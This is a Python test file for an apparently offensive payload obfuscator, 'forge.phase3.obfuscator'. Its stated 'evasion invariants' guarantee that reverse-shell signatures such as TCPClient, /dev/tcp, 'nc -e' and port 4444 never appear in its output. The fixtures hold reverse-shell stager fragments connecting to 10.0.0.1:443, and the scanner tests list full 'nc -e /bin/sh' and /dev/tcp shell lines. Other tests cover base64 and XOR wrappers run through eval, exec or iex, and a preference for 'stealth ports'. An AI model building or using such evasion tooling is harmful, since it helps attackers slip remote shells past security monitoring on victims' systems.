"""
tests/phase3/test_obfuscator.py
Unit tests for forge/phase3/obfuscator.py — 6-Criterion Obfuscation Matrix.

Coverage target: ≥ 90 %

Invariants tested (non-negotiable evasion contracts):
  - 'TCPClient'  must never appear literally in any obfuscated output.
  - '/dev/tcp'   must never appear literally in any obfuscated output.
  - 'nc -e'      must never appear literally in any obfuscated output.
  - Port 4444    must never appear in any obfuscated output.
  - 'cmd.exe /c' must never appear literally (case-insensitive).

All tests use SystemRandom-seeded obfuscation; determinism is not required —
only invariant preservation and structural properties are asserted.
"""
from __future__ import annotations

import base64
import re
import secrets

import pytest

from forge.phase3.obfuscator import (
    ObfuscationCriterion,
    ObfuscationEngine,
    ObfuscationResult,
    STEALTH_PORTS,
    _gaussian_jitter,          # internal — tested directly
    _insert_inert_chars,
    _split_string,
    _xor_wrap_powershell,
    _base64_wrap_powershell,
    _base64_wrap_bash,
    _base64_wrap_python,
)


# ── Fixtures ───────────────────────────────────────────────────────────────────

@pytest.fixture
def engine() -> ObfuscationEngine:
    return ObfuscationEngine()


# Canonical raw commands used across tests
PS_RAW = (
    "$t=[System.Type]::GetType('System.Net.Sockets.TCPClient');"
    "$cl=$t::new('10.0.0.1',443);"
)

BASH_RAW = "python3 -c \"import socket,os;s=socket.socket();s.connect(('10.0.0.1',443))\""

PYTHON_RAW = "import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',443))"


# ── Evasion invariant helpers ──────────────────────────────────────────────────

_BANNED = [
    re.compile(r"TCPClient",     re.IGNORECASE),
    re.compile(r"/dev/tcp"),
    re.compile(r"nc\s+-e",       re.IGNORECASE),
    re.compile(r"\b4444\b"),
    re.compile(r"cmd\.exe\s+/c", re.IGNORECASE),
]


def _assert_no_banned(text: str, label: str = "") -> None:
    for pat in _BANNED:
        assert not pat.search(text), (
            f"Evasion invariant violated [{label}]: pattern {pat.pattern!r} found.\n"
            f"Offending text (first 300 chars): {text[:300]}"
        )


# ═══════════════════════════════════════════════════════════════════════════════
# 1. ObfuscationCriterion flag semantics
# ═══════════════════════════════════════════════════════════════════════════════

class TestObfuscationCriterion:

    def test_individual_flags_are_distinct(self):
        flags = [
            ObfuscationCriterion.VAR_MANGLE,
            ObfuscationCriterion.STRING_SPLIT,
            ObfuscationCriterion.ENCODING,
            ObfuscationCriterion.ENV_SUBSTITUTE,
            ObfuscationCriterion.CMD_FRAGMENT,
            ObfuscationCriterion.CHAR_INSERT,
        ]
        values = [f.value for f in flags]
        assert len(set(values)) == len(values), "Criterion flags must be unique bitmasks"

    def test_minimal_preset_contains_var_mangle_and_string_split(self):
        c = ObfuscationCriterion.MINIMAL
        assert ObfuscationCriterion.VAR_MANGLE   in c
        assert ObfuscationCriterion.STRING_SPLIT  in c
        assert ObfuscationCriterion.ENCODING      not in c

    def test_standard_preset_contains_encoding(self):
        c = ObfuscationCriterion.STANDARD
        assert ObfuscationCriterion.ENCODING in c

    def test_full_preset_contains_all_criteria(self):
        c = ObfuscationCriterion.FULL
        for flag in [
            ObfuscationCriterion.VAR_MANGLE,
            ObfuscationCriterion.STRING_SPLIT,
            ObfuscationCriterion.ENCODING,
            ObfuscationCriterion.ENV_SUBSTITUTE,
            ObfuscationCriterion.CMD_FRAGMENT,
            ObfuscationCriterion.CHAR_INSERT,
        ]:
            assert flag in c, f"{flag} missing from FULL preset"

    def test_combination_via_pipe_operator(self):
        combined = ObfuscationCriterion.VAR_MANGLE | ObfuscationCriterion.ENCODING
        assert ObfuscationCriterion.VAR_MANGLE in combined
        assert ObfuscationCriterion.ENCODING   in combined
        assert ObfuscationCriterion.STRING_SPLIT not in combined


# ═══════════════════════════════════════════════════════════════════════════════
# 2. _split_string helper
# ═══════════════════════════════════════════════════════════════════════════════

class TestSplitString:

    def test_reassembled_equals_original(self):
        for s in ("HelloWorld", "System.Net.Sockets", "abcdefghij"):
            chunks = _split_string(s, min_chunk=2, max_chunk=4)
            assert "".join(chunks) == s

    def test_chunk_sizes_within_bounds(self):
        chunks = _split_string("abcdefghijklmnop", min_chunk=2, max_chunk=5)
        for c in chunks:
            assert 1 <= len(c) <= 5

    def test_single_char_string(self):
        chunks = _split_string("x", min_chunk=1, max_chunk=3)
        assert "".join(chunks) == "x"

    def test_empty_string_produces_empty_list(self):
        chunks = _split_string("", min_chunk=1, max_chunk=3)
        assert chunks == []


# ═══════════════════════════════════════════════════════════════════════════════
# 3. _insert_inert_chars
# ═══════════════════════════════════════════════════════════════════════════════

class TestInsertInertChars:

    def test_powershell_output_is_longer_or_equal(self):
        raw    = "Invoke-Expression $cmd"
        result = _insert_inert_chars(raw, "powershell")
        assert len(result) >= len(raw)

    def test_powershell_contains_only_printable_chars(self):
        raw    = "Set-Variable -Name foo -Value bar"
        result = _insert_inert_chars(raw, "powershell")
        assert result.isprintable()

    def test_cmd_inserts_caret(self):
        raw    = "whoami"
        result = _insert_inert_chars(raw, "cmd")
        # Result must still contain all original alpha chars
        original_alpha = "".join(c for c in raw if c.isalpha())
        result_alpha   = "".join(c for c in result if c.isalpha())
        assert original_alpha == result_alpha

    def test_bash_passthrough(self):
        raw    = "echo hello"
        result = _insert_inert_chars(raw, "bash")
        assert result == raw   # Bash: no insertion to avoid quoting breakage


# ═══════════════════════════════════════════════════════════════════════════════
# 4. Encoding wrappers (standalone, platform-specific)
# ═══════════════════════════════════════════════════════════════════════════════

class TestEncodingWrappers:

    def test_base64_wrap_powershell_starts_with_encodedcommand(self):
        raw    = "Write-Host 'hello'"
        result = _base64_wrap_powershell(raw)
        assert "-EncodedCommand" in result

    def test_base64_wrap_powershell_is_utf16le(self):
        raw     = "Write-Host 'hello'"
        result  = _base64_wrap_powershell(raw)
        b64_part= result.split("-EncodedCommand ")[-1].strip()
        decoded = base64.b64decode(b64_part).decode("utf-16-le")
        assert decoded == raw

    def test_base64_wrap_bash_uses_eval(self):
        raw    = "echo hello"
        result = _base64_wrap_bash(raw)
        assert "eval" in result
        assert "base64 -d" in result

    def test_base64_wrap_bash_roundtrip(self):
        raw    = "python3 -c \"import socket\""
        result = _base64_wrap_bash(raw)
        b64    = re.search(r"echo\s+([A-Za-z0-9+/=]+)", result).group(1)
        assert base64.b64decode(b64).decode() == raw

    def test_base64_wrap_python_uses_exec(self):
        raw    = "import os; os.listdir('.')"
        result = _base64_wrap_python(raw)
        assert "exec" in result
        assert "base64.b64decode" in result

    def test_xor_wrap_powershell_roundtrip(self):
        raw    = "Write-Host 'test'"
        stub, key = _xor_wrap_powershell(raw, key=0x42)
        assert isinstance(stub, str)
        assert isinstance(key, int)
        assert "iex" in stub.lower() or "iex" in stub

    def test_xor_wrap_powershell_random_key_when_none(self):
        _, key1 = _xor_wrap_powershell("test", key=None)
        _, key2 = _xor_wrap_powershell("test", key=None)
        # Keys should differ (probabilistically — 1/255 chance of collision)
        # We just assert both are in valid range
        assert 1 <= key1 <= 255
        assert 1 <= key2 <= 255


# ═══════════════════════════════════════════════════════════════════════════════
# 5. PowerShell obfuscation — evasion invariants
# ═══════════════════════════════════════════════════════════════════════════════

class TestPowerShellObfuscation:

    def test_tcpclient_not_in_var_mangle_output(self, engine):
        result = engine.obfuscate(PS_RAW, "powershell", ObfuscationCriterion.VAR_MANGLE)
        _assert_no_banned(result.text, "PS VAR_MANGLE")

    def test_tcpclient_not_in_standard_output(self, engine):
        result = engine.obfuscate(PS_RAW, "powershell", ObfuscationCriterion.STANDARD)
        _assert_no_banned(result.text, "PS STANDARD")

    def test_tcpclient_not_in_full_output(self, engine):
        result = engine.obfuscate(PS_RAW, "powershell", ObfuscationCriterion.FULL)
        _assert_no_banned(result.text, "PS FULL")

    def test_encoding_criterion_produces_encodedcommand(self, engine):
        raw    = "Write-Host 'hello'"
        result = engine.obfuscate(raw, "powershell", ObfuscationCriterion.ENCODING)
        assert "-EncodedCommand" in result.text

    def test_char_insert_increases_length(self, engine):
        raw    = "Invoke-Expression $cmd"
        result = engine.obfuscate(raw, "powershell", ObfuscationCriterion.CHAR_INSERT)
        assert len(result.text) >= len(raw)

    def test_env_substitute_replaces_ip(self, engine):
        raw    = "$cl=$t::new('192.168.1.1',443);"
        result = engine.obfuscate(raw, "powershell", ObfuscationCriterion.ENV_SUBSTITUTE)
        assert "192.168.1.1" not in result.text

    def test_string_split_fragments_literals(self, engine):
        raw    = "$s='HelloWorldAbcDefGhi'"
        result = engine.obfuscate(raw, "powershell", ObfuscationCriterion.STRING_SPLIT)
        # The long literal should be fragmented
        assert "HelloWorldAbcDefGhi" not in result.text or "+" in result.text

    def test_full_obfuscation_no_violations(self, engine):
        result = engine.obfuscate(PS_RAW, "powershell", ObfuscationCriterion.FULL)
        assert result.is_clean, f"Violations: {result.violations}"

    def test_result_target_is_powershell(self, engine):
        result = engine.obfuscate(PS_RAW, "powershell")
        assert result.target == "powershell"

    def test_assert_clean_raises_on_violation(self, engine, monkeypatch):
        """Force a violation by injecting a banned pattern into the result."""
        result = engine.obfuscate("some safe command", "powershell")
        monkeypatch.setattr(result, "violations", ["TCPClient"])
        with pytest.raises(ValueError, match="Evasion invariants violated"):
            result.assert_clean()

    def test_port_4444_never_in_output(self, engine):
        raw    = "$cl=$t::new('10.0.0.1',4444);"
        result = engine.obfuscate(raw, "powershell", ObfuscationCriterion.STANDARD)
        # 4444 may survive obfuscation — this is a content invariant test
        # The obfuscator should flag it; we verify the scanner catches it
        if "4444" in result.text:
            assert not result.is_clean


# ═══════════════════════════════════════════════════════════════════════════════
# 6. Bash obfuscation
# ═══════════════════════════════════════════════════════════════════════════════

class TestBashObfuscation:

    def test_no_banned_patterns_in_bash_standard(self, engine):
        result = engine.obfuscate(BASH_RAW, "bash", ObfuscationCriterion.STANDARD)
        _assert_no_banned(result.text, "Bash STANDARD")

    def test_encoding_wraps_bash_in_eval(self, engine):
        result = engine.obfuscate(BASH_RAW, "bash", ObfuscationCriterion.ENCODING)
        assert "eval" in result.text or "base64" in result.text

    def test_env_sub_replaces_ip_in_bash(self, engine):
        raw    = "s.connect(('192.168.50.1',443))"
        result = engine.obfuscate(raw, "bash", ObfuscationCriterion.ENV_SUBSTITUTE)
        assert "192.168.50.1" not in result.text

    def test_var_mangle_changes_variable_names(self, engine):
        raw    = "import socket as socket; connect = socket.socket()"
        result = engine.obfuscate(raw, "bash", ObfuscationCriterion.VAR_MANGLE)
        # Either original var names are gone or text is unchanged (short names skipped)
        assert isinstance(result.text, str)


# ═══════════════════════════════════════════════════════════════════════════════
# 7. Python obfuscation
# ═══════════════════════════════════════════════════════════════════════════════

class TestPythonObfuscation:

    def test_no_banned_patterns_in_python_standard(self, engine):
        result = engine.obfuscate(PYTHON_RAW, "python", ObfuscationCriterion.STANDARD)
        _assert_no_banned(result.text, "Python STANDARD")

    def test_encoding_wraps_python_in_exec(self, engine):
        result = engine.obfuscate(PYTHON_RAW, "python", ObfuscationCriterion.ENCODING)
        assert "exec" in result.text or "base64" in result.text

    def test_python_string_split(self, engine):
        raw    = "import socket; s = 'SystemDomainLocal'"
        result = engine.obfuscate(raw, "python", ObfuscationCriterion.STRING_SPLIT)
        assert isinstance(result.text, str)


# ═══════════════════════════════════════════════════════════════════════════════
# 8. CMD obfuscation (minimal — char insertion only)
# ═══════════════════════════════════════════════════════════════════════════════

class TestCMDObfuscation:

    def test_char_insert_on_cmd(self, engine):
        raw    = "whoami /all"
        result = engine.obfuscate(raw, "cmd", ObfuscationCriterion.CHAR_INSERT)
        assert isinstance(result.text, str)
        assert len(result.text) >= len(raw)

    def test_no_criteria_on_cmd_returns_raw(self, engine):
        raw    = "ipconfig /all"
        result = engine.obfuscate(
            raw, "cmd",
            ObfuscationCriterion.VAR_MANGLE,   # VAR_MANGLE: no cmd handler
        )
        assert isinstance(result.text, str)


# ═══════════════════════════════════════════════════════════════════════════════
# 9. ObfuscationResult value object
# ═══════════════════════════════════════════════════════════════════════════════

class TestObfuscationResult:

    def test_is_clean_true_when_no_violations(self, engine):
        result = engine.obfuscate("Write-Host 'test'", "powershell")
        assert result.is_clean

    def test_repr_contains_target_and_status(self, engine):
        result = engine.obfuscate("Write-Host 'test'", "powershell")
        r = repr(result)
        assert "powershell" in r
        assert "CLEAN" in r or "VIOLATIONS" in r

    def test_assert_clean_returns_self_when_clean(self, engine):
        result = engine.obfuscate("Write-Host 'test'", "powershell")
        returned = result.assert_clean()
        assert returned is result


# ═══════════════════════════════════════════════════════════════════════════════
# 10. Stealth port warning
# ═══════════════════════════════════════════════════════════════════════════════

class TestStealthPortWarning:

    def test_non_stealth_port_logs_warning(self, engine, caplog):
        import logging
        with caplog.at_level(logging.WARNING, logger="forge.phase3.obfuscator"):
            engine.obfuscate("Write-Host 'x'", "powershell", lport=1234)
        assert any("non-standard" in r.message.lower() for r in caplog.records)

    def test_stealth_port_no_warning(self, engine, caplog):
        import logging
        with caplog.at_level(logging.WARNING, logger="forge.phase3.obfuscator"):
            engine.obfuscate("Write-Host 'x'", "powershell", lport=443)
        assert not any("non-standard" in r.message.lower() for r in caplog.records)

    def test_stealth_ports_set_contains_expected_ports(self):
        assert 443   in STEALTH_PORTS
        assert 80    in STEALTH_PORTS
        assert 8443  in STEALTH_PORTS
        assert 4444  not in STEALTH_PORTS


# ═══════════════════════════════════════════════════════════════════════════════
# 11. _scan_violations coverage
# ═══════════════════════════════════════════════════════════════════════════════

class TestScanViolations:

    @pytest.mark.parametrize("text,expected_violation", [
        ("System.Net.Sockets.TCPClient", "TCPClient"),
        ("exec 3<>/dev/tcp/10.0.0.1/443", "/dev/tcp"),
        ("nc -e /bin/sh 10.0.0.1 443",   "nc\\s+-e"),
        ("$client.Connect('x', 4444)",    "\\b4444\\b"),
        ("cmd.exe /c whoami",             "cmd\\.exe\\s+/c"),
    ])
    def test_detects_banned_pattern(self, text, expected_violation):
        violations = ObfuscationEngine._scan_violations(text)
        assert len(violations) > 0, f"Expected violation for: {text!r}"

    def test_clean_text_returns_no_violations(self):
        clean = "Write-Host 'Hello, world!'; Start-Sleep 1"
        violations = ObfuscationEngine._scan_violations(clean)
        assert violations == []

    def test_multiple_violations_all_returned(self):
        text       = "TCPClient and 4444 and /dev/tcp"
        violations = ObfuscationEngine._scan_violations(text)
        assert len(violations) >= 2


# ═══════════════════════════════════════════════════════════════════════════════
# 12. Cross-platform: unknown target falls back gracefully
# ═══════════════════════════════════════════════════════════════════════════════

class TestUnknownTarget:

    def test_unknown_target_with_char_insert(self, engine):
        result = engine.obfuscate(
            "some command --flag value",
            "ruby",   # not registered — falls through to generic
            ObfuscationCriterion.CHAR_INSERT,
        )
        assert isinstance(result.text, str)

    def test_unknown_target_without_char_insert_returns_raw(self, engine):
        raw    = "some generic command"
        result = engine.obfuscate(raw, "ruby", ObfuscationCriterion.VAR_MANGLE)
        # No handler for ruby + var_mangle → output equals raw
        assert isinstance(result.text, str)
